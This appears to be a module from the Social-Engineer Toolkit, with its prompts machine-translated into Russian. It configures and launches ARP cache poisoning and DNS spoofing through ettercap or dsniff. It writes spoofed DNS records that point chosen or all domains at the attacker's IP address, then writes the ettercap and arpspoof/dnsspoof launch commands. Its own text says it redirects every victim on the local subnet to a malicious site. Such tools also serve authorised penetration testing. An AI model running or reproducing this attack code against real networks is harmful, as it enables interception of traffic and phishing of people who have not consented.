import subprocess
import re
import pexpect
import os
import time
import sys
from src.core.setcore import *

# Define to use ettercap or dsniff or nothing.
#
# Thanks to sami8007 and trcx for the dsniff addition

definepath = os.getcwd()

# grab config file
config = open("/etc/setoolkit/set.config", "r").readlines()
# grab our default directory
cwd = os.getcwd()
# set a variable as default to n or no
ettercapchoice = 'n'
# add dsniffchoice
dsniffchoice = 'n'
for line in config:
    # check for ettercap choice here
    match1 = re.search("ETTERCAP=ON", line)
    if match1:
        print_info("ARP Cache Poisoning установлен на " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        ettercapchoice = 'y'

    # check for dsniff choice here
    match2 = re.search("DSNIFF=ON", line)
    if match2:
        print_info("Отравление DNS DSNIFF установлено на " +
                   bcolors.GREEN + "ON" + bcolors.ENDC)
        dsniffchoice = 'y'
        ettercapchoice = 'n'

# GRAB CONFIG from SET
fileopen = open("/etc/setoolkit/set.config", "r").readlines()
for line in fileopen:
    # grab the ettercap interface
    match = re.search("ETTERCAP_INTERFACE=", line)
    if match:
        line = line.rstrip()
        interface = line.split("=")
        interface = interface[1]
        if interface == "NONE":
            interface = ""

    # grab the ettercap path
    etterpath = re.search("ETTERCAP_PATH=", line)
    if etterpath:
        line = line.rstrip()
        path = line.replace("ETTERCAP_PATH=", "")

        if not os.path.isfile(path):
            path = ("/usr/local/share/ettercap")

# if we are using ettercap then get everything ready
if ettercapchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IPадрес для подключения снова: "))
        update_options("IPADDR=" + ipaddr)

    if ettercapchoice == 'y':
        try:
            print("""
 Эта атака отравит всех жертв в вашей локальной подсети и перенаправит их
  когда они попадают на конкретный сайт. Следующая подсказка спросит вас, какой сайт вы
  захочет включить перенаправление DNS. Простой пример этого, если вы
  хотел, чтобы все в вашей подсети подключались к вам, когда они
  перейдите на www.google.com, после чего жертва будет перенаправлена ​​на ваш злонамеренный
  сайт. Вы также можете отравить всех и каждого, используя подстановочный знак
  '*' флаг.

  Если вы хотите отравить все записи DNS (по умолчанию), просто нажмите ENTER или *
""")
            print_info("Example: http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "Сайт для перенаправления на атаку машины [*]"))
            os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                # set default to * (everything)
                dns_spoof = "*"
            # remove old stale files
            subprocess.Popen(
                "rm etter.dns 1> /dev/null 2> /dev/null", shell=True).wait()
            # prep etter.dns for writing
            filewrite = open("etter.dns", "w")
            # send our information to etter.dns
            filewrite.write("%s A %s" % (dns_spoof, ipaddr))
            # close the file
            filewrite.close()
            # set bridge variable to nothing
            bridge = ""
            # assign -M arp to arp variable
            arp = "-M arp"
            print_error("ЗАПУСК ETTERCAP DNS_SPOOF ATTACK!")
            # spawn a child process
            os.chdir(cwd)
            time.sleep(5)
            filewrite = open(userconfigpath + "ettercap", "w")
            filewrite.write(
                "ettercap -T -q -i %s -P dns_spoof %s %s // //" % (interface, arp, bridge))
            filewrite.close()
            os.chdir(cwd)
        except Exception as error:
            os.chdir(cwd)
            # log(error)
            print_error("ERROR:An error has occured:")
            print("ERROR:" + str(error))

# if we are using dsniff
if dsniffchoice == 'y':

    # grab ipaddr
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP адрес для подключения: "))
        update_options("IPADDR=" + ipaddr)

    if dsniffchoice == 'y':
        try:
            print("""
 Эта атака отравит всех жертв в вашей локальной подсети и перенаправит их
  когда они попадают на конкретный сайт. Следующая подсказка спросит вас, какой сайт вы
  захочет включить перенаправление DNS. Простой пример этого, если вы
  хотел, чтобы все в вашей подсети подключались к вам, когда они
  перейдите на www.google.com, после чего жертва будет перенаправлена ​​на ваш злонамеренный
  сайт. Вы также можете отравить всех и каждого, используя подстановочный знак
  '*' флаг.

  Если вы хотите отравить все записи DNS (по умолчанию), просто нажмите ENTER или *
""")
            print_info("Example: http://www.google.com")
            dns_spoof = raw_input(
                setprompt("0", "Сайт для перенаправления на атаку машины [*]"))
            # os.chdir(path)
            # small fix for default
            if dns_spoof == "":
                dns_spoof = "*"
            subprocess.Popen(
                "rm %s/dnsspoof.conf 1> /dev/null 2> /dev/null" % (userconfigpath), shell=True).wait()
            filewrite = open(userconfigpath + "dnsspoof.conf", "w")
            filewrite.write("%s %s" % (ipaddr, dns_spoof))
            filewrite.close()
            print_error("LAUNCHING DNSSPOOF DNS_SPOOF ATTACK!")
            # spawn a child process
            os.chdir(cwd)
            # time.sleep(5)
            # grab default gateway, should eventually replace with pynetinfo
            # python module
            gateway = subprocess.Popen("netstat -rn|grep %s|awk '{print $2}'| awk 'NR==2'" % (
                interface), shell=True, stdout=subprocess.PIPE).communicate()[0]
            # open file for writing
            filewrite = open(userconfigpath + "ettercap", "w")
            # write the arpspoof / dnsspoof commands to file
            filewrite.write(
                "arpspoof %s | dnsspoof -f %s/dnsspoof.conf" % (gateway, userconfigpath))
            # close the file
            filewrite.close()
            # change back to normal directory
            os.chdir(cwd)
            # this is needed to keep it similar to format above for web gui
            # mode
            pause = raw_input("Нажмите <return> чтобы начать dsniff.")
        except Exception as error:
            os.chdir(cwd)
            print_error("ERROR:произошла ошибка:")
            print(bcolors.RED + "ERROR" + str(error) + bcolors.ENDC)
